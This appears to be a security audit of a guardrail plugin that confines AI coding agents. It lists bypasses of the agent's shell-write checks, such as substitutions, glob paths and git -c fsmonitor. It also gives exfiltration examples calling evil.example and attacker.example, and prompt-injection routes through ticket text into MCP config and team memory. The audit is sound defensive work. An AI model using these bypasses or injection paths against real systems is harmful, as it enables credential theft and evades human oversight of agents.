findings.title: Hermes plugin resolves node through the working directory on Windows
findings.description: shutil.which('node') resolves through the current directory first on Windows, so a node.exe, node.cmd or node.bat planted in the project directory runs instead of the real node.
findings.attackPath: pre_tool_call (.hermes-plugin/__init__.py:309-311) -> run-marker check (:273-279) -> shutil.which('node') (:283) -> subprocess.run([node, cli]) (:288). Path as walked by the verifier.
findings.exploit: A hostile repository ships a node.exe or node.cmd at its root; a native-Windows Hermes session in that repository runs it on every guarded tool call.
findings.mitigationExamined: No absolute path, no exclusion of the cwd, NoDefaultCurrentDirectoryInExePath not set; hooks/run-hook.cmd and guardrail-bridge.mjs guard this class elsewhere but the Hermes adapter does not.
findings.fix: Resolve node from PATH entries only (skip the cwd) or use an absolute path, and set NoDefaultCurrentDirectoryInExePath=1.

findings.title: Command substitutions, backticks and unquoted heredoc bodies are opaque to the shell-write analysis
findings.description: tokenize() skips $( ), backtick and unquoted-heredoc bodies and emits an opaque dyn word, so writes inside a substitution pass (echo $(echo x > src/app.js)). In the autopilot profile this reaches .git/config, .github/, .agents/ultrapowers.json and hooks/qa-guardrail. The qa-guardrail text rules cover only a fixed verb list; the autopilot 'substitution at segment start' rule (hooks/qa-guardrail:701) fires only at the start of a segment.
findings.attackPath: Prompt-injected agent's Bash tool call -> hooks/qa-guardrail -> qa-shell-writes.mjs tokenize() (:73) drops the substitution body -> write analysis sees only the outer command -> allow. Full path relayed only as this summary.
findings.exploit: echo $(echo x > src/app.js) writes outside reviews/<ticket>; in autopilot the same shape reaches protected paths.
findings.mitigationExamined: Fixed-verb text rules and the segment-start substitution rule only.
findings.fix: Recurse into substitutions, or deny any substitution during a run.

findings.title: cd handling: tilde and unscoped directory across subshells and pipelines
findings.description: 'cd ~' sets the tracked dir to <dir>/~. flush() on ( ) | & does not scope the tracked dir, so '(cd reviews/T); echo x > src/app.js' and 'cd reviews/T | cat; ...' are judged against the wrong directory.
findings.attackPath: Bash tool call with a subshell or pipeline cd -> cd tracking (:1215) leaks the directory into later segments -> a write to src/app.js is judged inside reviews/T -> allow. Full path relayed only as this summary.
findings.fix: Treat ~ as unresolved, and save and restore dir around subshells, pipelines and background segments.

findings.title: $'..' and $".." quoting is tokenized as literal text, hiding paths and names from the write analysis
findings.description: $'..' and $".." are tokenized as a literal $ plus quoted text, so a write to reviews/T/$'..'/$'..'/src/app.js is judged inside the area; protected names, .env and program names are hidden the same way.
findings.fix: Decode them or deny them.

findings.title: Autopilot protected-path matching ignores glob and brace expansion
findings.description: Autopilot protected-path matching is on the typed text: echo x > .gi[t]/config, hooks/qa-guardra[i]l, .agents/ultrapowers.jso[n], tee {.git,x}/config bypass it. Autopilot only.
findings.fix: Refuse targets containing * ? [ {.

findings.title: Secret-file rule matches only literal spelling, omits credential files, and the token-variable check is autopilot-only
findings.description: KEY_RE matches only the literal spelling (.e'n'v, .e*, x=.e; cat ${x}nv, ~/.aw[s]/credentials). It omits the glab config, gh hosts.yml, .npmrc, .netrc and .git-credentials. TRACKER_VARS/SECRET_VARS are checked only in autopilot (echo "$GH_TOKEN" works in the hunt).
findings.fix: Run KEY_RE over resolved words, extend the list, apply the variable check in every profile.

findings.title: git -c is skipped and read-only git subcommands can run a configured command in QA and hunt
findings.description: 'git -c' is skipped (GIT_GLOBAL_WITH_ARG) and status/diff/log/show/grep count as read-only, so 'git -c core.fsmonitor=<cmd> status' runs a command in QA and hunt. Only autopilot denies -c.
findings.fix: Deny -c, --config-env, --exec-path, -O and --ext-diff in every profile.

findings.title: .ultrapowers/ is writable in QA and hunt runs, so the run marker can be removed or widened
findings.description: In QA and hunt runs everything under .ultrapowers/ is writable; only the autopilot markers are protected, so removing the run marker makes every later call inert. Writing '..' into the marker widens the shell write area to the whole project because the ticket value is interpolated into reviews/<ticket>.
findings.fix: Protect qa-active and hunt-active from the agent and validate the ticket value.

findings.title: PowerShell tool command is analysed as POSIX shell
findings.description: The PowerShell tool command is analysed as POSIX. Aliases (sc, ac, ni, ri, mi, cpi, rni, si), [IO.File]::WriteAllText and iwr -OutFile are not denied.
findings.fix: On the PowerShell tool, allow only a read-only list.

findings.title: MCP tracker-write rule is gated on the autopilot profile only
findings.description: The MCP tracker-write rule is gated on PROFILE=autopilot. Hunt and QA can call MCP comment, mail, chat or Odoo write tools; an MCP call with no command falls through to exit 0 at :647.
findings.fix: Apply the rule to the hunt profile.

findings.title: Write analysis is a program-name deny-list, so unlisted programs and project scripts can write or execute
findings.description: Not caught: node reviews/x.mjs after the Write tool created it, bash script.sh, ./x, make, awk -f, sed -f, shuf -o, uniq IN OUT, zip, openssl -out, sqlite3, ed, curl --output-dir. Commit ba4bfe4 documents project scripts as contract-forbidden, but the guardrail does not enforce it.
findings.mitigationExamined: The contract forbids it; the hook does not.
findings.fix: Allow-list programs in hunt and QA.

findings.title: A symlink created in the same command is not resolved when write paths are checked
findings.description: 'ln -s ../.. reviews/T/up && echo x > reviews/T/up/src/app.js' passes because the link does not exist when paths are resolved; the ln link target and the single-operand form are never checked.
findings.fix: Check ln -s targets and refuse writes through same-command links.

findings.title: Egress host allow-list inspects only https URLs, so extra curl/wget operands escape it
findings.description: The egress allow-list greps only https?:// URLs: 'curl https://allowed.example/ "evil.example/?t=$GH_TOKEN"', --connect-to, --resolve and --proxy host:port pass. Applies only when qa.hosts.allowed is set.
findings.mitigationExamined: Applies only when qa.hosts.allowed is set.
findings.fix: Parse every curl and wget operand, refuse schemeless URLs, extra URLs, --connect-to, --resolve and --proxy.

findings.title: Autopilot envelope does not protect .mcp.json or other harness MCP/config files, which the next headless stage loads outside the guardrail

findings.title: In nested worktrees .git is a file the guardrail does not protect, so a stage can redirect gitdir and make engine git run attacker config
findings.description: In the nested topology .worktrees/<branch>/.git is a FILE. The guardrail regex (^|/)\.git/ needs a trailing slash, so the file is writable. A stage can write a directory with core.sshCommand or remote.origin.url and set the file to 'gitdir: <it>'; the engine's git push and tip in that worktree then use it with engine credentials (repos.mjs:158, :121; autopilot.mjs:698). trustState does not check where .git points.
findings.mitigationExamined: trustState does not check where .git points.
findings.fix: Deny writes ending in /.git, check git rev-parse --git-dir is under <clone>/.git/worktrees, and pass -c core.sshCommand= and -c core.fsmonitor= to engine git.

Runs before any guardrail marker exists. Windows only. Related to the Hermes finding.

findings.title: Autopilot envelope does not protect .mcp.json or other harness MCP/config files, which the next headless stage loads outside the guardrail
findings.description: PROTECTED_RE and AUTOPILOT_PROTECTED_RE (hooks/qa-guardrail:466,470; mirrored in hooks/lib/qa-shell-writes.mjs:172,178) protect .claude/, .gemini/hooks, .github, .githooks, .husky, settings.json under dot-dirs, the root agents.md/claude.md/gemini.md and the ticket state files. They do not match .mcp.json, .cursor/mcp.json, .vscode/mcp.json, .vscode/tasks.json, .codex/config.toml, .kimi/mcp.json, .factory/mcp.json or opencode.json. Writes anywhere else in the workspace are allowed in the autopilot profile (qa-guardrail:596-599). For the claude-code adapter the watcher starts each stage with --strict-mcp-config --mcp-config <root>/.mcp.json (autopilot.mjs:1066-1075, 1084), read from the same working tree the previous stage wrote, with a permission-bypass mode (harnesses.mjs:21). The engine commits only tasks/<ID> (repos.mjs:140, autopilot.mjs:166), so an edited .mcp.json is an uncommitted working-tree change that never appears in the spec/plan diff the approver reviews.
findings.attackPath: 1) Outsider-authored ticket text (issue body or comment on a public GitHub/GitLab repo, or Odoo chatter) is read by the scaffold/spec stage (fetch-ticket.mjs:284-302, 276-281 -> source.md -> brainstorm-task Step 4b). 2) A maintainer labels the ticket up:ready; the label is permission-checked, the content is not (autopilot.mjs:1256). 3) An injected stage writes an MCP server entry to <root>/.mcp.json with the Write tool; guard check at qa-guardrail:586-599 allows it. 4) The watcher spawns the next stage (autopilot.mjs:1171 -> 1084) and the harness starts the attacker's stdio MCP command as the user, outside every PreToolUse hook. 5) That process can read gh and glab credentials from the home directory, the SSH folder and the source tree, bypassing the stage-token and no-auth config isolation set in stageEnvironment (autopilot.mjs:1042-1062). In gated mode the human approves the spec/plan, which do not contain this file.
findings.exploit: A ticket comment tells the agent to register a docs MCP server in .mcp.json with a command that exfiltrates credentials. If the spec-stage model complies, the file is edited uncommitted, and the next headless stage launches it with the engine's user privileges.
findings.mitigationExamined: Ticket text is quoted between escaped markers and the skills and prompts tell the agent never to follow it (fetch-ticket.mjs:474-593, SKILL.md:27, 118). The ready label needs a write-access account (autopilot.mjs:817-825). The guardrail protects .claude/, .gemini/hooks, .github, .githooks, .husky and .git/. Stage tokens are read-only when configured. None of these cover .mcp.json. The guardrail denies tool calls, not the harness's own MCP process spawn. The approver sees only the committed spec and plan.
findings.fix: Add .mcp.json, .mcp.local.json, .cursor/, .vscode/, .codex/, .kimi/, .factory/ and opencode.json to the autopilot protected set in hooks/qa-guardrail, hooks/lib/qa-shell-writes.mjs and the Pi/OpenCode/Hermes/Gemini copies. In the engine, take the headless stage's MCP config from a snapshot the engine controls, or hash .mcp.json before and after each stage and block the stage if it changed.

findings.title: URL-carrying tools (WebFetch, Firecrawl, browser tools) have no egress restriction in autopilot stages unless qa.hosts.allowed or qa.urls is set
findings.description: The tool-URL loop at qa-guardrail:638-644 denies only hosts on qa.hosts.forbidden and, when the allow-list is non-empty, hosts not on it. The exfiltration-shape rules apply to shell curl/wget only (qa-guardrail:794-824). The shipped config leaves qa.urls and qa.hosts empty (templates/.agents/ultrapowers.json.tmpl, this repository's .agents/ultrapowers.json), so any host is reachable from a tool call. The project .mcp.json loaded into headless stages includes Firecrawl and brave-search (templates/.mcp.json), and WebFetch is also available.
findings.attackPath: Outsider ticket text or a linked page (fetched under brainstorm-task Step 4b) -> spec or execute stage model -> a tool call such as firecrawl_scrape or WebFetch with url=https://attacker.example/?d=<repository content or ticket data> -> qa-guardrail:638-644 passes it -> the attacker's server logs the data.
findings.exploit: A page linked from the ticket says to verify the endpoint by scraping a URL whose query string carries file contents the stage has read. The tool call is allowed because no host list is configured.
findings.mitigationExamined: The key-material rules stop the stage reading .env and mcp-secrets.env (qa-guardrail:442-458). linkFetchable marks private or internal hosts as not fetched in source.md (fetch-ticket.mjs:214-237), but it is advisory text, does no DNS or redirect check and does not constrain the tool. Shell egress is shaped and checked. When qa.urls or hosts.allowed is set the tool URLs are restricted.
findings.fix: In the autopilot profile, default-deny URL-carrying tool calls to hosts not derived from the ticket's own fetchable links or an autopilot.hosts.allowed list. Apply the shell rule for data in the URL to tool URLs. Document that an empty qa.hosts means open egress for stages.

findings.title: Team memory and nested instruction files are writable by autopilot stages, and uncommitted edits bypass PR review
findings.description: .agents/memory/** is not in the protected sets, and the instruction-file pattern ^(agents|claude|gemini)\.md$ is anchored to the project root, so nested AGENTS.md, .agents/memory/MEMORY.md, .cursor/rules/* and similar are writable in a stage (qa-guardrail:596-599). MEMORY.md is imported into every session through CLAUDE.md and the session nudge hooks ask agents to save memories (hooks/team-memory-nudge:26, hooks/team-memory-postcompact:35). The remember gate (skills/team-memory/SKILL.md steps 1-8) requires verified, durable, expensive and non-derivable facts, but nothing excludes facts that originate in ticket or page text, and memory-lint.mjs checks structure only. The engine commits only tasks/<ID>, so a stage's uncommitted edits stay in the developer's working tree.
findings.attackPath: Outsider ticket text -> scaffold/spec/execute stage model -> Write to .agents/memory/MEMORY.md and gotchas/x.md (a line phrased as an operating rule) -> the next session of any agent on that checkout loads the index as trusted project instructions -> steered behaviour in sessions that hold write, push and tracker rights. If an execute stage commits it, it reaches the code PR, where review is the only control.
findings.exploit: A ticket claims a verified team gotcha that tells agents to skip the guardrail or run a script, and asks to record it in team memory.
findings.mitigationExamined: Entries committed by a stage land in a PR. The pre-commit hook lints form (templates/.githooks/pre-commit.tmpl:37-77). The protected-path list covers .claude/ and the root instruction files. None is a provenance control, and none protects uncommitted working-tree edits.
findings.fix: Add .agents/memory/ and nested AGENTS.md/CLAUDE.md/GEMINI.md and .cursor/rules to the autopilot protected set. Add a rule to the remember gate that facts originating in ticket text, linked pages, PR text or tool output are never saved without the human partner restating them. Have the engine fail a stage whose run changed files outside the frozen scope.

findings.title: Scaffold and spec stages read every ticket commenter's text, unlike the changes stage, and the ticket title lands unmarked in the brief
findings.description: commentsFor and the Odoo chatter read (fetch-ticket.mjs:284-302, 344-346) pass all messages to source.md with no check of the author's permission. The changes stage does filter by write access and the approvers list (autopilot.mjs:256-285). The ticket title is written verbatim as the brief heading (scaffold-task.sh:99) outside any quote markers. In full mode the engine approves its own packet (autopilot.mjs:505-514), so no human reads the spec or plan before execute. Link fetching relies on advisory annotations and a text-only host check (fetch-ticket.mjs:208-237).
findings.attackPath: Any commenter on a public issue -> source.md Messages -> brainstorm-task Step 4b -> spec stage model, with a plan executed unreviewed in full mode. Entry point for the three Medium findings above.
findings.exploit: A comment on a ready-labelled public issue holds instructions aimed at the spec agent.
findings.mitigationExamined: Quote markers with escaped comment openers, body capped at 64 KB, a data-not-instructions line, Red Flags rows, and the ready label requiring a permitted account. In gated mode a human reviews the spec and plan.
findings.fix: Apply the same author-permission filter in fetch-ticket.mjs as in writeChangesComments. Quote the title in the brief. Resolve the link host and re-check it after redirects at the tool layer. Consider refusing full mode for sources whose tracker accepts comments from non-members.

findings.title: Kimi and Antigravity guardrail hook commands are working-directory-relative
findings.description: The Kimi manifest registers 'node ./hooks/lib/guardrail-cli.mjs' and the root hooks.json (Antigravity) 'node hooks/lib/guardrail-cli.mjs --antigravity', with no plugin-root variable. If a harness resolves the path against the project directory, the guardrail never runs or runs a repository-supplied file. Kimi is already listed as fail-open on hook error (harnesses.mjs:103). Merged with the code 8 Medium of the same class.
findings.attackPath: A hostile repository ships hooks/lib/guardrail-cli.mjs -> the user opens it in Kimi Code with the plugin installed -> the hook command resolves in the repository -> arbitrary code runs on the first tool call, or the guardrail is absent during a run.
findings.exploit: A repository includes a hooks/lib/guardrail-cli.mjs that reads credentials and always exits 0.
findings.mitigationExamined: tests/antigravity says the script path is relative to the plugin root; no equivalent evidence for Kimi.
findings.fix: Use an absolute path the harness expands or resolve relative to the manifest's own directory. Add a test that runs the hook with an unrelated cwd containing a decoy guardrail-cli.mjs.

templates/.mcp.json remote http servers (microsoftdocs, deepwiki): unauthenticated, no secrets; an injection channel only
npx -y with exact pinned versions in templates/.mcp.json: no lockfile integrity hash, supply-chain hardening only
GitHub ticket MCP server sends a bearer token to api.githubcopilot.com with X-MCP-Readonly: intended and read-only
Brainstorm companion server: per-session key, constant-time compare, loopback bind, origin check, CSP; screens are agent-authored HTML so injected script is speculative
Odoo markdownToNoteHtml and textToNoteHtml: every text is HTML-escaped before inline markup
task-review reviewers and qa-lane-6 run the branch's tests and configured suite commands unsandboxed: inherent to running the code under review
template .claude/settings.json allows Bash(npm test:*), pytest, cargo test: common convention, not an ultrapowers-specific path
loadSecretsFile copies credential-named variables into the stage environment so MCP servers work: documented behaviour
declined: A Bash call listing the plugin manifests was denied by the hunt guardrail; not worked around, the files were read with Read instead

Not read: skill bodies other than autopilot, brainstorm-task, new-task, team-memory; hunt-preflight.mjs and qa-preflight.mjs; the whole of hooks/lib/qa-shell-writes.mjs beyond its protected-path constants; tests/, docs/, specs and plans trees

No test, build or server was run and no network read command issued, so the claim that an explicit --mcp-config file skips the project MCP approval prompt rests on harness behaviour that was not exercised

verifications.title: Hermes plugin resolves node through the working directory on Windows
verifications.reason: At .hermes-plugin/__init__.py:283 shutil.which("node") searches the Hermes process's working directory first on Windows, nothing sets NoDefaultCurrentDirectoryInExePath, and line 288 runs the result whenever a run marker exists, so a planted node.exe/.cmd/.bat runs on every guarded tool call; the one step the repository does not show is native-Windows Hermes, which its tests and bridge treat as supported.
